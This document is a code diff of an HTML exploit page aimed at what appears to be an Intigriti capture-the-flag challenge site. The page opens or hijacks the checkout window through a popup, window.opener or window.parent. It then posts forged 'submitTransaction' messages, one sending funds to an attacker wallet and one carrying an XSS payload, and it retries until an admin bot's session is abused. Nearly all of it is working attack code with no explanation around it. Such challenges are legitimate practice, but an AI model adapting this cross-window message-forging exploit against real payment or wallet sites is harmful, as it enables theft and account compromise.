@@ -1,20 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Intigriti 0126 - XSS Exploit</title>
+    <title>XSS Exploit</title>
     <meta charset="UTF-8">
-    <style>
-        body { font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
-        .btn { background: #238636; color: white; padding: 15px 30px; border: none; font-size: 16px; cursor: pointer; }
-        .btn:hover { background: #2ea043; }
-    </style>
+    <style>body{font-family:monospace;background:#0a0a0a;color:#00ff00;padding:20px;}a{color:#00ff00;text-decoration:underline;}</style>
 </head>
 <body>
     <h1>EXPLOIT LOADED</h1>
     <div id="log">Starting...</div>
-
-    <!-- Auto-click button for admin bot -->
-    <button id="startBtn" class="btn" onclick="startExploit()">Start Exploit</button>
 
     <script>
         const BASE = 'https://challenge-0126.intigriti.io';
@@ -35,33 +28,16 @@
 
         track('start', 'loaded', {});
 
-        function startExploit() {
-            log('Opening checkout popup...');
-            track('opening_popup', 'start', {});
+        let popup = null;
+        let attemptCount = 0;
+        const MAX_ATTEMPTS = 20;
 
-            // Open checkout in popup - inherits admin session
-            const popup = window.open(
-                `${BASE}/checkout.html?currency=${CURRENCY}&price=1000000`,
-                'checkout',
-                'width=1000,height=800'
-            );
+        function sendTransactions(targetWindow) {
+            log('Sending transactions NOW...');
+            track('sending_tx', 'start', { window: !!targetWindow });
 
-            if (!popup) {
-                log('Popup blocked!');
-                track('popup_blocked', 'failed', {});
-                return;
-            }
-
-            log('Popup opened!');
-            track('popup_opened', 'success', {});
-
-            // Wait for checkout to fully load (increased timeout)
-            setTimeout(() => {
-                log('Sending transactions...');
-                track('sending', 'start', {});
-
-                // Send both instantly - async handler processes in parallel
-                popup.postMessage({
+            try {
+                targetWindow.postMessage({
                     type: 'submitTransaction',
                     transaction: {
                         toAddress: YOUR_WALLET,
@@ -70,10 +46,10 @@
                     }
                 }, '*');
 
-                track('tx1_sent', 'success', { to: YOUR_WALLET });
+                track('tx1_sent', 'success', {});
                 log('TX #1 sent');
 
-                popup.postMessage({
+                targetWindow.postMessage({
                     type: 'submitTransaction',
                     transaction: {
                         toAddress: XSS_WALLET,
@@ -82,24 +58,103 @@
                     }
                 }, '*');
 
-                track('tx2_sent', 'success', { to: XSS_WALLET });
+                track('tx2_sent', 'success', {});
                 log('TX #2 sent with XSS');
-                log('Waiting for processing...');
-
-            }, 10000); // 10 second wait for page to fully load
-
-            // Listen for any response
-            window.addEventListener('message', (event) => {
-                log('Message received: ' + JSON.stringify(event.data));
-                track('message_received', 'info', event.data);
-            });
+            } catch (e) {
+                log('Error: ' + e.message);
+                track('send_error', 'failed', { error: e.message });
+            }
         }
 
-        // Auto-click for admin bot (1-click exploit)
-        window.addEventListener('load', () => {
+        function checkPopupReady() {
+            attemptCount++;
+            track('check_attempt', 'checking', { attempt: attemptCount });
+
+            if (!popup || popup.closed) {
+                log('Popup was closed or blocked!');
+                track('popup_closed', 'failed', { attempt: attemptCount });
+                return;
+            }
+
+            // Try to send messages every second
+            if (attemptCount >= 5) {
+                log('Sending transaction messages...');
+                sendTransactions(popup);
+            }
+
+            if (attemptCount < MAX_ATTEMPTS) {
+                setTimeout(checkPopupReady, 1000);
+            } else {
+                log('Max attempts reached');
+                track('max_attempts', 'done', {});
+            }
+        }
+
+        // Also try window.opener method
+        if (window.opener && !window.opener.closed) {
+            log('Found window.opener - redirecting...');
+            track('opener_found', 'success', {});
+
+            window.opener.location.href = `${BASE}/checkout.html?currency=${CURRENCY}&price=1000000`;
+
             setTimeout(() => {
-                document.getElementById('startBtn').click();
-            }, 500);
+                log('Sending via window.opener...');
+                sendTransactions(window.opener);
+            }, 8000);
+
+            // Still try popup as backup
+            popup = window.open(`${BASE}/checkout.html?currency=${CURRENCY}&price=1000000`, 'checkout', 'width=1000,height=800');
+            if (popup) {
+                track('popup_opened', 'success', {});
+                setTimeout(checkPopupReady, 3000);
+            }
+        }
+        // Try window.parent
+        else if (window.parent && window.parent !== window) {
+            log('Found window.parent - redirecting...');
+            track('parent_found', 'success', {});
+
+            window.parent.location.href = `${BASE}/checkout.html?currency=${CURRENCY}&price=1000000`;
+
+            setTimeout(() => {
+                log('Sending via window.parent...');
+                sendTransactions(window.parent);
+            }, 8000);
+        }
+        // Use popup
+        else {
+            log('Trying popup approach...');
+            track('popup_attempt', 'start', {});
+
+            popup = window.open(
+                `${BASE}/checkout.html?currency=${CURRENCY}&price=1000000`,
+                'checkout',
+                'width=1000,height=800,scrollbars=yes'
+            );
+
+            if (popup) {
+                log('Popup opened!');
+                track('popup_opened', 'success', {});
+                setTimeout(checkPopupReady, 3000);
+            } else {
+                log('Popup blocked - trying fallback');
+                track('popup_blocked', 'trying_fallback', {});
+
+                // Fallback: use a link that auto-clicks
+                document.body.innerHTML += '<br><a id="link" href="' + `${BASE}/checkout.html?currency=${CURRENCY}&price=1000000` + '" target="_blank" rel="opener">Open Checkout</a>';
+
+                setTimeout(() => {
+                    document.getElementById('link').click();
+                    track('link_clicked', 'done', {});
+                    log('Link clicked');
+                }, 1000);
+            }
+        }
+
+        // Listen for responses
+        window.addEventListener('message', (event) => {
+            log('Got message: ' + JSON.stringify(event.data).substring(0, 100));
+            track('got_message', 'info', event.data);
         });
     </script>
 </body>
